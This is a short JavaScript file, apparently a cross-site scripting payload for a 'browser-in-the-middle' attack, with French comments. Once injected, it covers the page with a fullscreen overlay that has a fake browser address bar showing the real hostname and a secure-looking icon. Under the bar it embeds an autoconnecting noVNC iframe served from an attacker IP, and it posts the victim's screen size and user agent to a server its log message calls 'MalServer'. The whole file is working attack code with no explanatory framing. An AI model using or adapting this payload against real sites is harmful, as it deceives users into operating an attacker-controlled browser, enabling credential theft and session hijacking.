(function() {
    console.log('[BiTM XSS] Injecting noVNC iframe...');
    
    // Configuration
    const ATTACKER_IP = '10.25.11.18';
    
    // Créer overlay fullscreen
    const overlay = document.createElement('div');
    overlay.id = 'bitm-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 999999;
        background: white;
        margin: 0;
        padding: 0;
        overflow: hidden;
    `;
    
    // Fausse barre d'adresse
    const fakeAddressBar = document.createElement('div');
    fakeAddressBar.style.cssText = `
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 45px;
        background: #f1f3f4;
        border-bottom: 1px solid #dadce0;
        display: flex;
        align-items: center;
        padding: 0 12px;
        font-family: Arial, sans-serif;
        font-size: 14px;
        z-index: 1000000;
    `;
    
    fakeAddressBar.innerHTML = `
        <svg width="16" height="16" style="margin-right: 12px;" viewBox="0 0 24 24">
            <path fill="#5f6368" d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
            <path fill="#34a853" d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
        </svg>
        <div style="flex: 1; background: white; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center;">
            <svg width="16" height="16" style="margin-right: 8px;"><circle cx="8" cy="8" r="6" fill="#0f9d58"/></svg>
            <span style="color: #202124; font-weight: 500;">https://</span>
            <span style="color: #202124;">${window.location.hostname}</span>
        </div>
    `;
    
    // Iframe noVNC
    const iframe = document.createElement('iframe');
    iframe.src = `https://${ATTACKER_IP}:6443/vnc_lite.html?autoconnect=true&resize=scale&quality=9`;
    iframe.style.cssText = `
        position: absolute;
        top: 45px;
        left: 0;
        width: 100%;
        height: calc(100% - 45px);
        border: none;
        margin: 0;
        padding: 0;
    `;
    
    // Assembler
    overlay.appendChild(fakeAddressBar);
    overlay.appendChild(iframe);
    
    // Injecter dans la page
    document.body.appendChild(overlay);
    
    // Bloquer scroll sur body
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    
    console.log('[BiTM XSS] noVNC iframe injected successfully');
    
    // Envoyer taille écran
    fetch(`https://${ATTACKER_IP}:3000/postScreenSize`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            width: window.innerWidth,
            height: window.innerHeight - 45,
            userAgent: navigator.userAgent
        })
    }).catch(err => console.error('[BiTM XSS] Failed to notify MalServer:', err));
    
})();